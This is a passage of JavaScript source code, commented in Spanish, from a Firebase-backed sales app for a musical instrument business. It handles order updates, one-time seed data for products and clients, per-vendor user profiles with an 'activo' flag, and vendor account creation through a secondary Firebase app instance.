// Por eso primero se confirma que el nodo sigue existiendo antes de
// escribir. Si ya no existe, se avisa con un mensaje claro en vez de
// resucitar un registro incompleto que se va a volver a borrar solo.
function orderExists(id) {
  return refOrders.child(id).once('value').then(snap => snap.exists());
}

function updateOrder(id, orderData) {
  return refOrders.child(id).once('value').then(snapshot => {
    if (!snapshot.exists()) {
      const err = new Error(
        'Esta nota ya no existe: probablemente el borrado automático por antigüedad (30 días) ' +
        'la eliminó mientras la editabas. Vuelve a Historial y créala de nuevo si aún corresponde.'
      );
      err.orderGone = true;
      throw err;
    }
    return refOrders.child(id).update({ ...orderData });
  });
}

// =========================================================
// SEED — Solo se ejecuta una vez en la vida del proyecto.
// Usa meta/seeded como bandera permanente.
// =========================================================

const refMeta = db.ref('meta/seeded');

const SEED_PRODUCTS = {
  'GTR-001':   { name: "Guitarra Electroacústica Yamaha", desc: "APX600 · Natural",            price: 890,  stock: 12, category: 'cuerdas' },
  'BAJO-002':  { name: "Bajo Eléctrico Fender",            desc: "Player Precision · Sunburst", price: 2150, stock: 2,  category: 'cuerdas' },
  'BATK-003':  { name: "Batería Acústica Pearl",           desc: "Export EXX · 5 piezas",       price: 3400, stock: 7,  category: 'percusion' },
  'FLAUT-004': { name: "Flauta Traversa Jupiter",          desc: "JFL700 · Plata",              price: 680,  stock: 15, category: 'viento' },
  'ACC-005':   { name: "Cuerdas Guitarra D'Addario",       desc: "EJ16 · Phosphor Bronze 12-53",price: 38,   stock: 4,  category: 'accesorios' }
};

const SEED_CLIENTS = {
  '20601234567': { nombre: "Instrumentos del Sur S.A.C.", ciudad: 'Lima' },
  '20512986754': { nombre: "Melody Center E.I.R.L.",      ciudad: 'Arequipa' },
  '20489001234': { nombre: "Sonido Andino S.A.",          ciudad: 'Cusco' },
  '20345678901': { nombre: "Ritmo Norte S.A.C.",          ciudad: 'Trujillo' },
  '20778123456': { nombre: "Clave Musical S.R.L.",        ciudad: 'Lima' },
  '20612398741': { nombre: "Percusión Total E.I.R.L.",    ciudad: 'Piura' },
  '20411987654': { nombre: "Armonía del Norte S.A.C.",    ciudad: 'Lima' }
};

async function seedIfEmpty() {
  try {
    const seededSnap = await refMeta.get();
    if (seededSnap.exists()) return;
    const [productsSnap, clientsSnap] = await Promise.all([
      refProducts.get(),
      refClients.get()
    ]);
    if (!productsSnap.exists()) await refProducts.set(SEED_PRODUCTS);
    if (!clientsSnap.exists()) await refClients.set(SEED_CLIENTS);
    await refMeta.set(true);
  } catch (err) {
    console.error('Seed error:', err);
  }
}

// Ya no se ejecuta automáticamente en cada carga de página — con
// datos reales en la base, esta lectura (aunque chica) ya no aporta
// nada y se repetía para cada usuario, en cada página, para siempre.
// Si alguna vez necesitas sembrar datos de prueba de nuevo, puedes
// llamar a seedIfEmpty() manualmente desde la consola del navegador.
// seedIfEmpty();

// =========================================================
// USUARIOS (cuentas individuales de vendedor + admin)
// =========================================================
// Antes había UNA sola cuenta de vendedor compartida entre todo el
// equipo (fevermiusiclog+vendedor@gmail.com). Eso significaba que si
// algo salía mal, era imposible saber cuál persona lo hizo, y que
// para bloquear a alguien que dejaba de trabajar ahí había que
// cambiarle la contraseña a TODO el equipo de una vez.
//
// Ahora cada vendedor tiene su propia cuenta de Firebase Auth, y el
// rol/nombre/estado de cada una vive en /users/{uid}:
//   { nombre: "Juan Pérez", email: "juan@...", rol: "vendedor" | "admin", activo: true|false, creadoEn: <timestamp> }
//
// El campo "activo" es la pieza clave: no es solo un adorno visual.
// Las reglas de Firebase (ver firebase-database.rules.json) exigen
// que activo === true para poder leer o escribir CUALQUIER dato de
// la app. Apagar a alguien desde "Registros" lo bloquea de verdad,
// del lado del servidor — no solo le oculta botones en pantalla.

function getUserProfile(uid) {
  return refUsers.child(uid).once('value').then(snap => (snap.exists() ? { uid, ...snap.val() } : null));
}

async function getAllUsers() {
  const snap = await refUsers.once('value');
  const out = [];
  snap.forEach(child => { out.push({ uid: child.key, ...child.val() }); });
  // Más recientes primero, para que un vendedor nuevo aparezca arriba.
  out.sort((a, b) => (b.creadoEn || 0) - (a.creadoEn || 0));
  return out;
}

function setUserActive(uid, activo) {
  return refUsers.child(uid).update({ activo: !!activo });
}

// Elimina el perfil del usuario en /users. Esto le quita el acceso
// a la app de inmediato: las reglas de Firebase exigen que exista
// /users/{uid} con activo === true para leer o escribir cualquier
// dato, así que sin el nodo el usuario queda completamente bloqueado
// aunque intente iniciar sesión.
//
// Importante: esto NO borra la cuenta de Firebase Auth en sí. El SDK
// de Auth del lado del cliente solo permite que un usuario borre SU
// PROPIA cuenta (currentUser.delete()) — borrar la cuenta de OTRO
// usuario requiere el Admin SDK desde un backend, igual que
// scripts/limpiar-historial.js usa Admin SDK para el historial.
// Si en algún momento se quiere el borrado completo (Auth + perfil),
// se puede armar un script en scripts/ con el mismo patrón:
// admin.auth().deleteUser(uid) + admin.database().ref('users/'+uid).remove().
function deleteUserProfile(uid) {
  return refUsers.child(uid).remove();
}

// Crea una cuenta de vendedor SIN cerrar la sesión del admin que la
// está creando. Truco necesario: el SDK de Firebase Auth, al crear un
// usuario nuevo desde el cliente, automáticamente inicia sesión como
// ESE usuario nuevo — reemplazaría la sesión del admin en la misma
// pestaña. Para evitarlo, se abre una segunda instancia temporal de
// la app de Firebase (con otro nombre), se crea la cuenta ahí adentro
// (afectando solo a esa instancia aislada), y se descarta esa
// instancia al terminar — la sesión del admin en la app principal
// nunca se toca.
// El dominio técnico que convierte un "usuario" corto (ej. "ana")
// en algo con forma de correo, que es lo único que Firebase Auth
// acepta para iniciar sesión con contraseña. El vendedor nunca ve
// ni escribe esto — solo su usuario y su contraseña.
const USERNAME_AUTH_DOMAIN = 'fever.local';

// Normaliza "Ana Torres", "ana.torres", "AnaTorres " → "anatorres":
// minúsculas, sin espacios ni acentos ni símbolos. Así "Usuario"
// funciona como si fuera un nombre de usuario normal, y dos
// variantes de escritura del mismo nombre ("Ana" vs "ana ") no
// generan cuentas técnicamente distintas por accidente.
function normalizeUsername(usuario) {
  return String(usuario || '')
    .normalize('NFD').replace(/[\u0300-\u036f]/g, '') // quita acentos
    .toLowerCase()
    .replace(/[^a-z0-9._-]/g, '');
}

function usernameToAuthEmail(usuario) {
  return normalizeUsername(usuario) + '@' + USERNAME_AUTH_DOMAIN;
}

// Crea una cuenta de vendedor identificada por un "usuario" corto
// (no un correo real) SIN cerrar la sesión del admin que la está
// creando — mismo truco de instancia secundaria que ya se explica
// más abajo. La unicidad del usuario la garantiza el propio
// Firebase Auth: dos personas no pueden registrar el mismo
// "usuario@fever.local" — la segunda recibe el error
// auth/email-already-in-use tal como si hubiera escrito un correo
// repetido.
async function createVendorAccount(usuario, password, nombre, correo) {
  const usuarioNormalizado = normalizeUsername(usuario);
  if (!usuarioNormalizado) {
    throw new Error('El usuario debe tener al menos una letra o número.');
  }
  const authEmail = usernameToAuthEmail(usuarioNormalizado);

  const secondaryApp = firebase.initializeApp(firebaseConfig, 'Secondary-' + Date.now());
  try {
    const cred = await secondaryApp.auth().createUserWithEmailAndPassword(authEmail, password);
    const uid = cred.user.uid;
    await refUsers.child(uid).set({
      nombre: nombre || usuarioNormalizado,
      usuario: usuarioNormalizado,
      correo: correo || '',   // solo informativo (contacto / recuperar clave) — no se usa para iniciar sesión
      rol: 'vendedor',
      activo: true,
      creadoEn: Date.now(),
    });
    await secondaryApp.auth().signOut();
    return uid;
  } finally {
    // Pase lo que pase (éxito o error), no dejar la instancia secundaria colgada.
    await secondaryApp.delete().catch(() => {});
  }
}
